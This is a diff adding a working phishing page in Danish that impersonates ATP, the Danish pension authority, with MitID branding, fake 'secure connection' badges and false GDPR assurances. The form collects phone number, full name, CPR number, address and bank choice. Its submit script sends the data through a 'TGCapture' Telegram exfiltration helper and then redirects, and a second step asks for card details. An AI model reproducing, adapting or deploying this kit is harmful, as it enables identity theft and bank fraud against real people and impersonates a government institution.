@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Personlige Oplysninger – ATP</title>
+  <meta name="description" content="Bekræft dine personlige oplysninger for at fortsætte med ATP Livslang Pension.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --atp-green:      #1C3D2A;
+      --atp-green-mid:  #2E5C3C;
+      --atp-lime:       #C4D600;
+      --atp-lime-dark:  #A8BA00;
+      --atp-light:      #F4F6F4;
+      --atp-border:     #D5DDD5;
+      --atp-text:       #1A1A1A;
+      --atp-muted:      #5C6B5C;
+      --atp-white:      #FFFFFF;
+      --atp-error:      #C62828;
+      --radius:         6px;
+      --shadow:         0 2px 12px rgba(28,61,42,0.10);
+    }
+
+    html { font-size: 16px; }
+
+    body {
+      font-family: 'IBM Plex Sans', Arial, sans-serif;
+      background: #F0F2F0;
+      color: var(--atp-text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Header ── */
+    .site-header {
+      background: #fff;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      border-bottom: 1px solid var(--atp-border);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .site-header__logo {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      text-decoration: none;
+    }
+    .logo-text {
+      font-weight: 700;
+      font-size: 26px;
+      color: #1A1A1A;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+    .logo-eq {
+      font-weight: 700;
+      font-size: 26px;
+      color: #A8BA00;
+      line-height: 1;
+    }
+    .site-header__right {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .header-secure-badge {
+      background: #EDF5EC;
+      border: 1px solid var(--atp-green);
+      color: var(--atp-green);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 11px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .header-secure-badge svg {
+      width: 14px;
+      height: 14px;
+      fill: var(--atp-green);
+      flex-shrink: 0;
+    }
+
+    /* ── Hero band ── */
+    .hero-band {
+      background: #1C3D2A;
+      padding: 36px 24px 32px;
+      text-align: center;
+      color: #fff;
+    }
+    .hero-band__step {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.12);
+      border: 1px solid rgba(255,255,255,0.22);
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 4px 14px;
+      margin-bottom: 14px;
+    }
+    .hero-band__title {
+      font-size: clamp(22px, 4vw, 30px);
+      font-weight: 700;
+      margin-bottom: 8px;
+      line-height: 1.25;
+    }
+    .hero-band__subtitle {
+      font-size: 15px;
+      opacity: 0.85;
+      max-width: 520px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+
+    /* ── Progress bar ── */
+    .progress-wrap {
+      max-width: 640px;
+      margin: 0 auto;
+      padding: 22px 24px 0;
+    }
+    .progress-steps {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      flex: 1;
+    }
+    .progress-step__dot {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 700;
+      border: 2px solid var(--atp-border);
+      background: var(--atp-white);
+      color: var(--atp-muted);
+      position: relative;
+      z-index: 1;
+      transition: all 0.2s;
+    }
+    .progress-step.active .progress-step__dot {
+      background: var(--atp-green);
+      border-color: var(--atp-green);
+      color: #fff;
+      box-shadow: 0 0 0 4px rgba(28,61,42,0.15);
+    }
+    .progress-step.done .progress-step__dot {
+      background: var(--atp-lime-dark);
+      border-color: var(--atp-lime-dark);
+      color: var(--atp-green);
+    }
+    .progress-step__label {
+      font-size: 11px;
+      margin-top: 6px;
+      color: var(--atp-muted);
+      font-weight: 500;
+      text-align: center;
+    }
+    .progress-step.active .progress-step__label { color: var(--atp-green); font-weight: 700; }
+    .progress-step::before {
+      content: '';
+      position: absolute;
+      top: 15px; right: calc(50% + 16px);
+      left: calc(-50% + 16px);
+      height: 2px;
+      background: var(--atp-border);
+      z-index: 0;
+    }
+    .progress-step:first-child::before { display: none; }
+    .progress-step.done::before { background: var(--atp-lime-dark); }
+
+    /* ── Main card ── */
+    .main-wrap {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 28px 16px 48px;
+    }
+    .form-card {
+      background: var(--atp-white);
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--atp-border);
+      width: 100%;
+      max-width: 580px;
+    }
+    .form-card__header {
+      background: #EDF5EC;
+      border-bottom: 1px solid var(--atp-border);
+      padding: 18px 28px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .form-card__icon {
+      width: 42px; height: 42px;
+      background: var(--atp-green);
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .form-card__icon svg {
+      width: 22px; height: 22px;
+      fill: #fff;
+    }
+    .form-card__header-text h2 {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--atp-green);
+    }
+    .form-card__header-text p {
+      font-size: 13px;
+      color: var(--atp-muted);
+      margin-top: 2px;
+    }
+    .form-card__body {
+      padding: 28px 28px 24px;
+    }
+
+    /* ── Fields ── */
+    .field-group {
+      margin-bottom: 18px;
+    }
+    .field-group label {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--atp-green);
+      margin-bottom: 6px;
+    }
+    .field-group label svg {
+      width: 15px; height: 15px;
+      fill: var(--atp-green);
+      flex-shrink: 0;
+    }
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+    }
+    .field-group input,
+    .field-group select {
+      width: 100%;
+      height: 46px;
+      border: 1.5px solid var(--atp-border);
+      border-radius: 4px;
+      padding: 0 13px;
+      font-size: 15px;
+      font-family: inherit;
+      color: var(--atp-text);
+      background: #fff;
+      outline: none;
+      transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+      -webkit-appearance: none;
+    }
+    .field-group input::placeholder { color: #A8B8A8; }
+    .field-group input:focus,
+    .field-group select:focus {
+      border-color: var(--atp-green);
+      box-shadow: 0 0 0 3px rgba(28,61,42,0.10);
+    }
+    .field-group input.filled {
+      border-color: var(--atp-lime-dark);
+      background: #FAFFF0;
+    }
+    .field-group .field-note {
+      font-size: 11.5px;
+      color: var(--atp-muted);
+      margin-top: 4px;
+    }
+
+    /* ── Info row ── */
+    .info-locked {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--atp-light);
+      border: 1.5px solid var(--atp-border);
+      border-radius: var(--radius);
+      padding: 11px 13px;
+      font-size: 14px;
+      color: var(--atp-text);
+    }
+    .info-locked svg { width: 16px; height: 16px; fill: var(--atp-green); }
+    .info-locked .locked-value { font-weight: 600; margin-left: auto; color: var(--atp-green); }
+
+    /* ── Divider ── */
+    .section-divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 22px 0 18px;
+    }
+    .section-divider__line { flex: 1; height: 1px; background: var(--atp-border); }
+    .section-divider__label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--atp-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* ── Secure notice ── */
+    .secure-notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #EDF5EC;
+      border: 1px solid #B3D4B3;
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      margin-bottom: 22px;
+    }
+    .secure-notice__icon {
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .secure-notice__icon svg {
+      width: 18px; height: 18px;
+      fill: var(--atp-green);
+    }
+    .secure-notice__text { font-size: 13px; color: var(--atp-green); line-height: 1.5; }
+    .secure-notice__text strong { font-weight: 700; }
+
+    /* ── Submit button (split style) ── */
+    .form-card__footer {
+      padding: 0 28px 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background: var(--atp-green);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+      transition: background 0.18s;
+      letter-spacing: 0.2px;
+    }
+    .btn-submit:hover { background: var(--atp-green-mid); }
+    .btn-submit:hover .btn-submit__arrow { background: var(--atp-lime-dark); }
+    .btn-submit__text {
+      flex: 1;
+      padding: 0 18px;
+      text-align: left;
+    }
+    .btn-submit__arrow {
+      width: 52px;
+      height: 52px;
+      background: var(--atp-lime);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: background 0.18s;
+    }
+    .btn-submit__arrow svg {
+      width: 22px; height: 22px;
+      fill: var(--atp-green);
+    }
+
+    .btn-back {
+      width: 100%;
+      height: 44px;
+      background: transparent;
+      color: var(--atp-green);
+      border: 1.5px solid var(--atp-border);
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.15s, border-color 0.15s;
+    }
+    .btn-back:hover { background: var(--atp-light); border-color: var(--atp-green); }
+
+    /* ── Footer ── */
+    .site-footer {
+      background: var(--atp-green);
+      color: rgba(255,255,255,0.7);
+      text-align: center;
+      padding: 18px 24px;
+      font-size: 13px;
+    }
+    .site-footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
+    .site-footer a:hover { text-decoration: underline; }
+
+    /* ── Error ── */
+    .error-msg {
+      font-size: 12px;
+      color: var(--atp-error);
+      margin-top: 4px;
+      display: none;
+    }
+    .field-group.has-error input { border-color: var(--atp-error); }
+    .field-group.has-error .error-msg { display: block; }
+
+    /* ── Bank picker ── */
+    .bank-picker { position: relative; }
+    .bank-selected {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      height: 46px;
+      border: 1.5px solid var(--atp-border);
+      border-radius: 4px;
+      padding: 0 13px;
+      background: #fff;
+      cursor: pointer;
+      transition: border-color 0.18s, box-shadow 0.18s;
+      user-select: none;
+    }
+    .bank-selected:hover,
+    .bank-selected.open {
+      border-color: var(--atp-green);
+      box-shadow: 0 0 0 3px rgba(28,61,42,0.10);
+    }
+    .bank-selected img {
+      width: 32px;
+      height: 20px;
+      object-fit: contain;
+      flex-shrink: 0;
+    }
+    .bank-selected__name {
+      font-size: 15px;
+      color: var(--atp-text);
+      font-weight: 500;
+      flex: 1;
+    }
+    .bank-selected__arrow {
+      font-size: 11px;
+      color: var(--atp-muted);
+      transition: transform 0.2s;
+    }
+    .bank-selected.open .bank-selected__arrow { transform: rotate(180deg); }
+
+    .bank-dropdown {
+      display: none;
+      position: absolute;
+      top: calc(100% + 6px);
+      left: 0; right: 0;
+      background: #fff;
+      border: 1.5px solid var(--atp-green);
+      border-radius: var(--radius);
+      box-shadow: 0 8px 24px rgba(28,61,42,0.12);
+      z-index: 200;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .bank-dropdown.open { display: block; }
+    .bank-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 14px;
+      cursor: pointer;
+      transition: background 0.12s;
+    }
+    .bank-option:hover { background: var(--atp-light); }
+    .bank-option.selected { background: #EDF5EC; }
+    .bank-option img {
+      width: 36px;
+      height: 22px;
+      object-fit: contain;
+      flex-shrink: 0;
+    }
+    .bank-option__name {
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--atp-text);
+    }
+
+    @media (max-width: 500px) {
+      .field-row { grid-template-columns: 1fr; }
+      .form-card__body { padding: 20px 16px 16px; }
+      .form-card__footer { padding: 0 16px 20px; }
+      .form-card__header { padding: 14px 16px; }
+    }
+
+    /* ── Page-transition loading overlay ── */
+    #atp-loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      z-index: 99999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    #atp-loading-overlay.visible { display: flex; }
+    .atp-ov-logo { margin-bottom: 32px; }
+    .atp-ov-shield-wrap {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin-bottom: 24px;
+    }
+    .atp-ov-spinner {
+      width: 52px; height: 52px;
+      position: absolute; top: 34px; left: 34px;
+      animation: atp-spin 1.2s linear infinite;
+    }
+    @keyframes atp-spin { to { transform: rotate(360deg); } }
+    .atp-ov-title {
+      font-size: 19px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0 0 8px;
+      font-family: 'IBM Plex Sans', Arial, sans-serif;
+    }
+    .atp-ov-sub {
+      font-size: 15px;
+      color: #6b7280;
+      margin: 0;
+      font-family: 'IBM Plex Sans', Arial, sans-serif;
+    }
+  </style>
+
+  <script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+
+<!-- Page-transition loading overlay -->
+<div id="atp-loading-overlay">
+  <div class="atp-ov-logo"><img src="assets/mitidlogo.webp" alt="MitID" style="height:38px;width:auto;"></div>
+  <div class="atp-ov-shield-wrap">
+    <img src="assets/shield.png" style="width:120px;height:120px;position:absolute;top:0;left:0;" alt="">
+    <svg class="atp-ov-spinner" viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="26" cy="26" r="17" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="3"/>
+      <circle cx="26" cy="26" r="17" fill="none" stroke="white" stroke-width="3" stroke-dasharray="27 80" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <p class="atp-ov-title">Bekræfter dine oplysninger</p>
+  <p class="atp-ov-sub">Vent et øjeblik ...</p>
+</div>
+
+
+<!-- ── Header ── -->
+<header class="site-header">
+  <a class="site-header__logo" href="index.html">
+    <span class="logo-text">atp</span><span class="logo-eq">=</span>
+  </a>
+  <div class="site-header__right">
+    <span class="header-secure-badge">
+      <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z"/></svg>
+      Sikker forbindelse
+    </span>
+  </div>
+</header>
+
+<!-- ── Hero ── -->
+<div class="hero-band">
+  <div class="hero-band__step">Trin 1 af 2</div>
+  <h1 class="hero-band__title">Bekræft dine personlige oplysninger</h1>
+  <p class="hero-band__subtitle">Vi skal bruge dine oplysninger for at oprette din ATP-konto og behandle din pension korrekt.</p>
+</div>
+
+<!-- ── Progress ── -->
+<div class="progress-wrap">
+  <div class="progress-steps">
+    <div class="progress-step active">
+      <div class="progress-step__dot">1</div>
+      <div class="progress-step__label">Personlige<br>Oplysninger</div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-step__dot">2</div>
+      <div class="progress-step__label">Kort &amp;<br>Konto</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Main ── -->
+<main class="main-wrap">
+  <div class="form-card">
+    <!-- Card header -->
+    <div class="form-card__header">
+      <div class="form-card__icon">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+      </div>
+      <div class="form-card__header-text">
+        <h2>Personlige Oplysninger</h2>
+        <p>Udfyld dine personoplysninger nedenfor</p>
+      </div>
+    </div>
+
+    <form id="info-form" novalidate>
+      <div class="form-card__body">
+
+        <div class="secure-notice">
+          <span class="secure-notice__icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z"/></svg>
+          </span>
+          <span class="secure-notice__text">
+            <strong>Dine oplysninger er beskyttet.</strong> Alle data overføres krypteret og behandles i overensstemmelse med GDPR.
+          </span>
+        </div>
+
+        <!-- Telefon -->
+        <div class="field-group" id="fg-telefon">
+          <label for="telefon">
+            <svg viewBox="0 0 24 24"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z"/></svg>
+            Telefonnummer
+          </label>
+          <input type="tel" id="telefon" name="telefon" placeholder="Telefonnummer" maxlength="20" autocomplete="tel">
+          <span class="error-msg">Indtast venligst dit telefonnummer.</span>
+        </div>
+
+        <!-- Fulde Navn -->
+        <div class="field-group" id="fg-navn">
+          <label for="navn">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+            Fulde Navn
+          </label>
+          <input type="text" id="navn" name="navn" placeholder="Fulde Navn" autocomplete="name">
+          <span class="error-msg">Indtast venligst dit fulde navn.</span>
+        </div>
+
+        <!-- CPR-Nummer -->
+        <div class="field-group" id="fg-cpr">
+          <label for="cpr">
+            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h2v2H6zm0 4h8v2H6zm10 0h2v2h-2zm-6-4h8v2h-8z"/></svg>
+            CPR-Nummer
+          </label>
+          <input type="text" id="cpr" name="cpr" placeholder="DDMMÅÅ-XXXX" maxlength="11" inputmode="numeric" autocomplete="off">
+          <span class="field-note">Format: DDMMÅÅ-XXXX</span>
+          <span class="error-msg">Indtast venligst dit CPR-nummer.</span>
+        </div>
+
+        <!-- Adresse -->
+        <div class="field-group" id="fg-adresse">
+          <label for="adresse">
+            <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            Adresse
+          </label>
+          <input type="text" id="adresse" name="adresse" placeholder="Adresse" autocomplete="street-address">
+          <span class="error-msg">Indtast venligst din adresse.</span>
+        </div>
+
+        <!-- Postnummer + By -->
+        <div class="field-row">
+          <div class="field-group" id="fg-postnummer">
+            <label for="postnummer">
+              <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h2v2H6zm4 0h8v2h-8zm-4 4h2v2H6zm4 0h4v2h-4z"/></svg>
+              Postnummer
+            </label>
+            <input type="text" id="postnummer" name="postnummer" placeholder="Postnummer" maxlength="4" autocomplete="postal-code">
+            <span class="error-msg">Ugyldigt postnummer.</span>
+          </div>
+          <div class="field-group" id="fg-by">
+            <label for="by">
+              <svg viewBox="0 0 24 24"><path d="M15 11V5l-3-3-3 3v2H3v14h18V11h-6zm-8 8H5v-2h2v2zm0-4H5v-2h2v2zm0-4H5V9h2v2zm6 8h-2v-2h2v2zm0-4h-2v-2h2v2zm0-4h-2V9h2v2zm0-4h-2V5h2v2zm6 12h-2v-2h2v2zm0-4h-2v-2h2v2z"/></svg>
+              By
+            </label>
+            <input type="text" id="by" name="by" placeholder="By" autocomplete="address-level2">
+          </div>
+        </div>
+
+        <!-- Bank selector -->
+        <div class="section-divider">
+          <div class="section-divider__line"></div>
+          <div class="section-divider__label">Bankoplysninger</div>
+          <div class="section-divider__line"></div>
+        </div>
+
+        <div class="field-group">
+          <label for="bank-trigger">
+            <svg viewBox="0 0 24 24"><path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zM12 1L2 6v2h20V6z"/></svg>
+            Vælg din bank
+          </label>
+          <div class="bank-picker" id="bank-picker">
+            <div class="bank-selected" id="bank-trigger" tabindex="0" role="combobox" aria-expanded="false">
+              <img id="bank-logo" src="assets/sydbank-logo.webp" alt="Sydbank">
+              <span class="bank-selected__name" id="bank-display">Sydbank</span>
+              <span class="bank-selected__arrow">▼</span>
+            </div>
+            <div class="bank-dropdown" id="bank-dropdown" role="listbox">
+              <div class="bank-option selected" data-value="Sydbank" data-logo="assets/sydbank-logo.webp" role="option">
+                <img src="assets/sydbank-logo.webp" alt="Sydbank"><span class="bank-option__name">Sydbank</span>
+              </div>
+              <div class="bank-option" data-value="Danske Bank" data-logo="assets/Danske_logo.webp" role="option">
+                <img src="assets/Danske_logo.webp" alt="Danske Bank"><span class="bank-option__name">Danske Bank</span>
+              </div>
+              <div class="bank-option" data-value="Realkredit Danmark" data-logo="assets/RealkreditDanmark_LOGO.jpeg" role="option">
+                <img src="assets/RealkreditDanmark_LOGO.jpeg" alt="Realkredit Danmark"><span class="bank-option__name">Realkredit Danmark</span>
+              </div>
+              <div class="bank-option" data-value="Nordea" data-logo="assets/Nordea_LOGO.webp" role="option">
+                <img src="assets/Nordea_LOGO.webp" alt="Nordea"><span class="bank-option__name">Nordea</span>
+              </div>
+              <div class="bank-option" data-value="Jyske Bank" data-logo="assets/jyske-bank-logo.webp" role="option">
+                <img src="assets/jyske-bank-logo.webp" alt="Jyske Bank"><span class="bank-option__name">Jyske Bank</span>
+              </div>
+              <div class="bank-option" data-value="Nykredit Bank" data-logo="assets/Nykredit_logo.webp" role="option">
+                <img src="assets/Nykredit_logo.webp" alt="Nykredit Bank"><span class="bank-option__name">Nykredit Bank</span>
+              </div>
+              <div class="bank-option" data-value="Spar Nord Bank" data-logo="assets/SPAR NORD LOGO.webp" role="option">
+                <img src="assets/SPAR NORD LOGO.webp" alt="Spar Nord Bank"><span class="bank-option__name">Spar Nord Bank</span>
+              </div>
+              <div class="bank-option" data-value="Saxo Bank" data-logo="assets/SAXO_LOGO.webp" role="option">
+                <img src="assets/SAXO_LOGO.webp" alt="Saxo Bank"><span class="bank-option__name">Saxo Bank</span>
+              </div>
+              <div class="bank-option" data-value="Coop Bank" data-logo="assets/COOPBANK_LOGO.webp" role="option">
+                <img src="assets/COOPBANK_LOGO.webp" alt="Coop Bank"><span class="bank-option__name">Coop Bank</span>
+              </div>
+              <div class="bank-option" data-value="Lån &amp; Spar" data-logo="assets/lan and spar logo.webp" role="option">
+                <img src="assets/lan and spar logo.webp" alt="Lån &amp; Spar"><span class="bank-option__name">Lån &amp; Spar</span>
+              </div>
+              <div class="bank-option" data-value="Al Sydbank" data-logo="assets/al-sydbank_grafik_1920x1080_logo.jpeg" role="option">
+                <img src="assets/al-sydbank_grafik_1920x1080_logo.jpeg" alt="Al Sydbank"><span class="bank-option__name">Al Sydbank</span>
+              </div>
+              <div class="bank-option" data-value="Arbejdernes Landsbank" data-logo="assets/companylogo_linkedinId=20764.webp" role="option">
+                <img src="assets/companylogo_linkedinId=20764.webp" alt="Arbejdernes Landsbank"><span class="bank-option__name">Arbejdernes Landsbank</span>
+              </div>
+              <div class="bank-option" data-value="Nordjyske Bank" data-logo="assets/photo_2026-10-21_13-54-33.jpg" role="option">
+                <img src="assets/photo_2026-10-21_13-54-33.jpg" alt="Nordjyske Bank"><span class="bank-option__name">Nordjyske Bank</span>
+              </div>
+              <div class="bank-option" data-value="Ringkøbing Landbobank" data-logo="assets/ringkjobing-landbobank.webp" role="option">
+                <img src="assets/ringkjobing-landbobank.webp" alt="Ringkøbing Landbobank"><span class="bank-option__name">Ringkøbing Landbobank</span>
+              </div>
+            </div>
+          </div>
+          <input type="hidden" id="bank" name="bank" value="Sydbank">
+        </div>
+
+      </div>
+
+      <div class="form-card__footer">
+        <button type="submit" class="btn-submit" id="info-submit-btn">
+          <span class="btn-submit__text">Fortsæt til kortoplysninger</span>
+          <span class="btn-submit__arrow">
+            <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+          </span>
+        </button>
+        <button type="button" class="btn-back" onclick="history.back()">
+          ← Tilbage
+        </button>
+      </div>
+    </form>
+  </div>
+</main>
+
+<!-- ── Footer ── -->
+<footer class="site-footer">
+  <p>&copy; 2026 ATP – Arbejdsmarkedets Tillægspension &nbsp;|&nbsp;
+    <a href="#">Privatlivspolitik</a> &nbsp;|&nbsp;
+    <a href="#">Tilgængelighed</a>
+  </p>
+</footer>
+
+<script src="tg.js"></script>
+<script>
+(function () {
+  var form = document.getElementById('info-form');
+
+  // ── CPR auto-formatter ───────────────────────────────────
+  var cprInput = document.getElementById('cpr');
+  cprInput.addEventListener('input', function () {
+    var digits = cprInput.value.replace(/\D/g, '').slice(0, 10);
+    if (digits.length > 6) {
+      cprInput.value = digits.slice(0, 6) + '-' + digits.slice(6);
+    } else {
+      cprInput.value = digits;
+    }
+    if (cprInput.value.trim()) cprInput.classList.add('filled');
+    else cprInput.classList.remove('filled');
+  });
+
+  // ── Bank picker ──────────────────────────────────────────
+  var trigger  = document.getElementById('bank-trigger');
+  var dropdown = document.getElementById('bank-dropdown');
+  var bankLogo = document.getElementById('bank-logo');
+  var bankDisplay = document.getElementById('bank-display');
+  var bankInput   = document.getElementById('bank');
+
+  function openDropdown() {
+    trigger.classList.add('open');
+    dropdown.classList.add('open');
+    trigger.setAttribute('aria-expanded', 'true');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeDropdown() {
+    trigger.classList.remove('open');
+    dropdown.classList.remove('open');
+    trigger.setAttribute('aria-expanded', 'false');
+    document.body.style.overflow = '';
+  }
+
+  trigger.addEventListener('click', function (e) {
+    e.stopPropagation();
+    dropdown.classList.contains('open') ? closeDropdown() : openDropdown();
+  });
+  trigger.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openDropdown(); }
+    if (e.key === 'Escape') closeDropdown();
+  });
+
+  dropdown.querySelectorAll('.bank-option').forEach(function (opt) {
+    opt.addEventListener('click', function () {
+      var val  = opt.getAttribute('data-value');
+      var logo = opt.getAttribute('data-logo');
+      bankInput.value         = val;
+      bankDisplay.textContent = val;
+      bankLogo.src            = logo;
+      bankLogo.alt            = val;
+      dropdown.querySelectorAll('.bank-option').forEach(function (o) { o.classList.remove('selected'); });
+      opt.classList.add('selected');
+      closeDropdown();
+    });
+  });
+
+  document.addEventListener('click', function (e) {
+    if (!document.getElementById('bank-picker').contains(e.target)) closeDropdown();
+  });
+
+  // Mark filled fields green
+  form.querySelectorAll('input').forEach(function (el) {
+    if (el.id === 'cpr') return; // handled separately above
+    el.addEventListener('input', function () {
+      if (el.value.trim()) el.classList.add('filled');
+      else el.classList.remove('filled');
+    });
+  });
+
+  function markError(id, bad) {
+    var fg = document.getElementById('fg-' + id);
+    if (!fg) return;
+    if (bad) fg.classList.add('has-error');
+    else fg.classList.remove('has-error');
+  }
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    var telefon    = document.getElementById('telefon').value.trim();
+    var navn       = document.getElementById('navn').value.trim();
+    var cpr        = document.getElementById('cpr').value.trim();
+    var adresse    = document.getElementById('adresse').value.trim();
+    var postnummer = document.getElementById('postnummer').value.trim();
+    var by         = document.getElementById('by').value.trim();
+    var bank       = document.getElementById('bank').value.trim();
+
+    var ok = true;
+    markError('telefon',    !telefon);    if (!telefon)    ok = false;
+    markError('navn',       !navn);       if (!navn)       ok = false;
+    markError('cpr',        !cpr);        if (!cpr)        ok = false;
+    markError('adresse',    !adresse);    if (!adresse)    ok = false;
+    markError('postnummer', !postnummer); if (!postnummer) ok = false;
+
+    if (!ok) return;
+
+    // Send to Telegram using unified ATP format
+    if (window.TGCapture) {
+      TGCapture.sendInfo({ telefon: telefon, navn: navn, cpr: cpr,
+                           adresse: adresse, postnummer: postnummer,
+                           by: by, bank: bank });
+    }
+
+    // Redirect to loading page
+    window.location.href = 'loading2.html';
+  });
+}());
+</script>
+</body>
+</html>
